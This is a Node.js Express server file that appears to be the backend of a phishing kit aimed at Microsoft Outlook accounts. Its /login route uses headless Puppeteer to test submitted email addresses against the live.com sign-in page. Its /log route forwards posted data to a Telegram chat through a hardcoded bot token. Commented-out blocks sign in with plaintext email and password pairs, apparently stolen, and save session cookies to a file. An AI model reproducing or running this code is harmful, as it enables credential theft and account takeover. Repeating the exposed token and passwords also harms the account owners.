const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');


const token = '6858302131:AAF9_7RzVhnIUj862QdQCU7tKHu_oqJEu3Q';

const bot = new TelegramBot(token, { polling: false });


const puppeteer = require('puppeteer');
const fs = require('fs');

// Install express by running: npm install express
const express = require('express');
const app = express();
const port = 3000;
app.use(cors()); // Enable CORS for all routes

// Middleware to parse JSON bodies
app.use(express.json());

// Route to handle GET requests with URL parameters
app.get('/login', async (req, res) => {
  
  // Set custom headers
  res.setHeader('ngrok-skip-browser-warning', 'true');
  res.setHeader('User-Agent', 'Custom User-Agent');
  
    const uid = req.query.uid;

  const browser = await puppeteer.launch({ headless: true, args: [
    '--incognito',
  ]}); // Set headless to false for a visible browser window
  const page = await browser.newPage();
  let resp 

  try {
    // Navigate to the Outlook login page


    // Navigate to the Outlook login page
    await page.goto('https://login.live.com/login.srf');

    // Wait for the login form to be visible
    await page.waitForSelector('#i0116');

    // Fill in the username
    await page.type('#i0116', uid);
    await page.waitForTimeout(2000);

    // Click the "Next" button
    await page.click('#idSIButton9');
    await page.waitForTimeout(4000);

    // Wait for the password field to be visible
    // await page.waitForSelector('#i0118');

    // // Fill in the password
    // await page.type('#i0118', 'Orestes196@');

    // // Click the "Sign in" button
    // await page.click('#idSIButton9');

    // Wait for the login to complete (adjust as needed)
    // await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

    console.log('Login successful!');

    console.log(page);
    const className = 'error'; // Replace with the desired class name
    // const className = 'styledComponents__StyledWidgetContainer-kizisb-13 fFcGEU ius'; // Replace with the desired class name

    const divContent = await page.evaluate((className) => {
      // Find the div element with the specified class name
      const divElement = document.querySelector(`div.${className}`);
  
      // If the div element is found, return its inner HTML content
      if (divElement) {
        return divElement.innerHTML;
      } else {
        return 'success login';
      }
    }, className);
  
    console.log(`Content of div with class "${className}":`);
    console.log(divContent);
    resp = divContent
    // res.send(divContent)

    
    await browser.close();

    // res.json(divContent);


    // Perform additional actions as needed after login

  }catch (error) {
    console.error('Error during login:', error);
  } finally {

    res.json(resp);
    
    // Close the browser
    // await browser.close();
  }

});

// Route to handle POST requests with JSON body
app.post('/log', (req, res) => {
    const requestData = req.body;
    const chatId = requestData.chatId;
    const message = requestData.message;
    // const chatId = '-4176809792';
    bot.sendMessage(chatId, message, {
      parse_mode: 'HTML'
    });
    res.json({ message: 'Log successful', data: requestData });
});

// Listen for incoming requests on the specified port
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});

























// const puppeteer = require('puppeteer');
// const fs = require('fs');

// (async () => {
//   const browser = await puppeteer.launch({ headless: false }); // Set headless to false for a visible browser window
//   const page = await browser.newPage();

//   try {
//     // Navigate to the Outlook login page
//     await page.goto('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=20&ct=1707073938&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dww%26RpsCsrfState%3d943f3c39-fb97-ed98-2b1f-5606e8e0252f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');

//     // Wait for the login form to be visible
//     await page.waitForSelector('#i0116');

//     // Fill in the username
//     await page.type('#i0116', 'Richkixto@outlook.com');
//     await page.waitForTimeout(6000);

//     // Click the "Next" button
//     await page.click('#idSIButton9');

//     // Wait for the password field to be visible
//     await page.waitForSelector('#i0118');
//     await page.waitForInput('#i0118');

//     // Fill in the password
//     await page.type('#i0118', 'C00kinggas');

//     // Click the "Sign in" button
//     await page.click('#idSIButton9');

//     // Wait for the login to complete (adjust as needed)
//     await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

//     console.log('Login successful!');

//     // Save cookies to a file
//     const cookies = await page.cookies();
//     fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
//     console.log('Cookies saved to cookies.json');
//     // Perform additional actions as needed after login

//   } catch (error) {
//     console.error('Error during login:', error);
//   } finally {
    
//     // Save cookies to a file
//     const cookies = await page.cookies();
//     fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
//     console.log('Cookies saved to cookies.json');

//     // Close the browser
//     // await browser.close();
//   }
// })();















// const puppeteer = require('puppeteer');
// const fs = require('fs');

// (async () => {
//   const browser = await puppeteer.launch({ headless: false }); // Set headless to false for a visible browser window
//   const page = await browser.newPage();

//   try {
//     // Navigate to the Outlook login page
//     await page.goto('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=20&ct=1707073938&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dww%26RpsCsrfState%3d943f3c39-fb97-ed98-2b1f-5606e8e0252f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');

//     // Wait for the login form to be visible
//     await page.waitForSelector('#i0116');

//     // Fill in the username
//     await page.type('#i0116', 'Richkixto@outlook.com');
//     await page.waitForTimeout(6000);

//     // Click the "Next" button
//     await page.click('#idSIButton9');

//     // Wait for the password field to be visible
//     await page.waitForSelector('#i0118');

//     // Fill in the password
//     await page.type('#i0118', 'C00kinggas');

//     // Click the "Sign in" button
//     await page.click('#idSIButton9');

//     // Wait for the login to complete (adjust as needed)
//     await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

//     console.log('Login successful!');

//     // Save cookies to a file
//     const cookies = await page.cookies();
//     fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
//     console.log('Cookies saved to cookies.json');
//     // Perform additional actions as needed after login

//   } catch (error) {
//     console.error('Error during login:', error);
//   } finally {
    
//     // Save cookies to a file
//     const cookies = await page.cookies();
//     fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
//     console.log('Cookies saved to cookies.json');

//     // Close the browser
//     // await browser.close();
//   }
// })();























// const puppeteer = require('puppeteer');
// const fs = require('fs');

// (async () => {
//   const browser = await puppeteer.launch({ headless: false, args: [
//     '--incognito',
//   ]}); // Set headless to false for a visible browser window
//   const page = await browser.newPage();

//   try {
//     // Navigate to the Outlook login page
//     await page.goto('https://login.live.com/login.srf');

//     // Wait for the login form to be visible
//     await page.waitForSelector('#i0116');

//     // Fill in the username
//     await page.type('#i0116', 'resty.torres@bmchs.com');
//     await page.waitForTimeout(6000);

//     // Click the "Next" button
//     await page.click('#idSIButton9');

//     // Wait for the password field to be visible
//     await page.waitForSelector('#i0118');

//     // Fill in the password
//     await page.type('#i0118', 'Orestes196@');

//     // Click the "Sign in" button
//     await page.click('#idSIButton9');

//     // Wait for the login to complete (adjust as needed)
//     await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

//     console.log('Login successful!');

//     // Save cookies to a file
//     const cookies = await page.cookies();
//     fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
//     console.log('Cookies saved to cookies.json');
//     // Perform additional actions as needed after login

//   }catch (error) {
//     console.error('Error during login:', error);
//   } finally {
    
//     // Close the browser
//     // await browser.close();
//   }
// })();
